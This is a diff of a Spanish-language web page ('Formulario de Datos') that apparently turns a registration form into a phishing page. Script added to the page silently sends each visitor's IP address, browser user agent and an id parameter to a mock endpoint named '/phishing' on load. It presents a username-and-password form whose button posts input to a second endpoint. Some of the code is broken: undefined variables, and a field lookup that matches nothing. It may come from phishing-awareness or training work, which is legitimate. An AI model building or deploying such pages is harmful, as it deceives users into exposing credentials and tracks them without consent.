@@ -1,24 +1,299 @@
 <!DOCTYPE html>
+
 <html>
+
+<style>
+
+
+
+    form {
+
+        /* Centrar el formulario en la página */
+
+        margin: 0 auto;
+
+        width: 400px;
+
+        /* Esquema del formulario */
+
+        padding: 1em;
+
+        border: 1px solid #CCC;
+
+        border-radius: 1em;
+
+      }
+
+      
+
+      ul {
+
+        list-style: none;
+
+        padding: 0;
+
+        margin: 0;
+
+      }
+
+      
+
+      form li + li {
+
+        margin-top: 1em;
+
+      }
+
+      
+
+      label {
+
+        
+
+        display: inline-block;
+
+        width: 90px;
+
+        text-align: right;
+
+      }
+
+      
+
+      input,
+
+      textarea {
+
+        /* Todos los campos de texto con la misma configuración de letra */
+
+        font: 1em sans-serif;
+
+      
+
+        /* Tamaño uniforme del campo de texto */
+
+        width: 300px;
+
+        box-sizing: border-box;
+
+      
+
+        /* Hacer coincidir los bordes del campo del formulario */
+
+        border: 1px solid #999;
+
+      }
+
+      
+
+      input:focus,
+
+      textarea:focus {
+
+        /* Destacado adicional para elementos que tienen el cursor */
+
+        border-color: #000;
+
+      }
+
+      
+
+      textarea {
+
+        /* Alinear los campos de texto con sus etiquetas */
+
+        vertical-align: top;
+
+      
+
+        /* Espacio para escribir texto */
+
+        height: 5em;
+
+      }
+
+      
+
+      .button {
+
+        /* Alinear los botones con los campos de texto */
+
+        padding-left: 30px; 
+
+      }
+
+      
+
+      button {
+
+        
+
+        margin-left: .5em;
+
+      }
+
+</style>    
+
 <head>
+
     <meta charset="utf-8">
+
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
+
     <title>Formulario de Datos</title>
+
     <meta name="viewport" content="width=device-width, initial-scale=1">
-    <link rel="stylesheet" type="text/css" media="screen" href="main.css">
-    <script src="main.js"></script>
+
+   <!-- <link rel="stylesheet" type="text/css" media="screen" href="main.css">
+
+    <!--<script src="main.js"></script>-->
+
 </head>
-<body>
-    <form name="form" action="https://formsubmit.co/german.racines@ayc.ec" method="post">
+
+<script>
+//Funcion cuando carga la pagina
+    function load() {
+
+    var url = new URL(window.location);
+
+    var id = url.searchParams.get("id");
+
+    console.log(id);
+
+
+
+    //DireccionIP del usuario
+
+    var xhr = new XMLHttpRequest();
+
+    xhr.open("GET", "https://ipapi.co/json/", true);
+
+    xhr.onreadystatechange = function () {
+
+        if (xhr.readyState === 4 && xhr.status === 200) {
+
+            var response = JSON.parse(xhr.responseText);
+
+            var ipAddress = response.ip;
+
+            console.log(ipAddress);
+
+
+
+            //Navegador web de usuario
+
+            var browserType = navigator.userAgent;
+
+            console.log(browserType);
+
+
+
+            //Guardar valores 
+
+            save("id", id, 0);
+
+            save("ip", ipAddress, 0);
+
+            save("browser", browserType, 0);
+
+        }
+
+    };
+
+    xhr.send();
+
+}
+
     
-        Nombres:<Input  type="text" name="nombres" required><p></p>
-        Apellidos:<Input  type="text" name="apellidos" required><p></p>
-        Direccion:<Input  type="text" name="direccion" required><p></p>
-        Fecha de nacimiento :<Input  type="date" name="fechanacimiento" required><p></p>
-        Usuario:<Input  type="text" name="usuario" required><p></p>
+
+    function save(param, value,state,ip,browser) {
+
+
+
+      var serviceDest="http://demo4568541.mockable.io/phishing", method=""
+
+      if (state==0) {
+
+        console.log("guardar apenas ingresa a la página" + 
+
+        "parametro recibido "+ param , " valor del parametro "+value, "estado"+state,"DirIp"+ipAddress,"browser"+browserType)
+
+        method="POST"
+
+      }
+
+      else {
+
+      console.log("guardar al dar click en el boton guardar")
+
+      serviceDest="http://demo4568541.mockable.io/p1"
+
+      method="POST"
+
+      }
+
+
+
+      fetch(serviceDest, {
+
+        headers: {
+
+          'Content-type': 'application/json'
+
+        },
+
+        method: method,
+
+        body: JSON.stringify({param: value, state:state})
+
+        })
+
+        .then((response) => response.json())
+
+        .then((json) => console.log(json));
+
+
+
+    }
+
+
+
+    function saveForm() {
+
+      console.log("se manda a guardar al dar clic al boton")
+
+      var name= document.getElementById("name").value;
+
+      console.log(name);
+
+      save("name", name, 1) 
+
+      
+
+    }
+
+</script>
+
+
+
+<body onload="load()">
+
+    
+
+    <form name="form">
+
+
+
+        Usuario:   <Input  type="text" name="usuario" required><p></p>
+
         Contraseña:<Input  type="password" name="contrasena" required><p></p>
-            <input type="submit" value="Registrar">
+
+            <input type="button" value="Guardar" onclick="saveForm()">
+
             <input type="reset" value="Borrar">
+
     </form>
+
 </body>    
+
 </html>
